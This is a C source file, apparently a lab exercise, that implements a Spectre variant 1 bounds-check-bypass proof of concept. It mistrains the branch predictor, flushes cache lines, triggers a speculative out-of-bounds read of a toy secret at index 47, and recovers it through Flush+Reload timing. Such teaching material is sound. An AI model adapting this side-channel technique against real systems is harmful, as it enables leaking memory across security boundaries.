#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)

#define LINE_SIZE 64
#define L1_SIZE 32768
#define L1_CACHE_LINES (L1_SIZE * sizeof(int) / LINE_SIZE)  // number of lines, including every set + way in cache

#define NUM_INTS_IN_LINE (LINE_SIZE / sizeof(int))          // amount of ints that can fit in a line

#define L1_THRESHOLD 40

#define SHARED_MEM_OFFSET 100 * NUM_INTS_IN_LINE

//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
int limit = 20;
void victim_function(int* secret_array, int *shared_mem, int offset) {
    int secret_data = secret_array[offset];
    int index = (secret_data * NUM_INTS_IN_LINE);

    clflush(&limit);

    if (offset < limit) {
        volatile int value = shared_mem[index];
    }
}

int main(int argc, char **argv) {
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);

    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    *((char *)huge_page) = 1; // dummy write to trigger page allocation

    //** STEP 1: Allocate an array into the mmap */
    int *secret_array = (int *)huge_page;

    // Initialize the array
    for (int i = 0; i < 100; i++) {
        secret_array[i] = i;
    }

     // Allocate a shared memory array
    int *shared_mem = (int *)huge_page + SHARED_MEM_OFFSET;

    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times
    int num_train = 10;
    for (int i = 0; i < num_train; i++) {
        victim_function(secret_array, shared_mem, i % limit);
    }

    //** STEP 3: Clear cache using clflsuh from utility.h */
    for (int i = 0; i < 100; i++) {
        clflush(&secret_array[i]);
        clflush(&shared_mem[i * NUM_INTS_IN_LINE]);
    }

    //** STEP 4: Call victim function again with bounds bypass value */
    int malicious_offset = 47;
    victim_function(secret_array, shared_mem, malicious_offset);

    //** STEP 5: Reload mmap to see load times */
    // Just read the mmap's first 100 integers
    for (int i = 0; i < 100; i++) {
        uint64_t time = measure_one_block_access_time((uint64_t)&shared_mem[i * NUM_INTS_IN_LINE]);
        if (time < L1_THRESHOLD) {
            printf("Load time for secret_array[%d]: %ld cycles\n", i, time);
        }
    }

    return 0;
}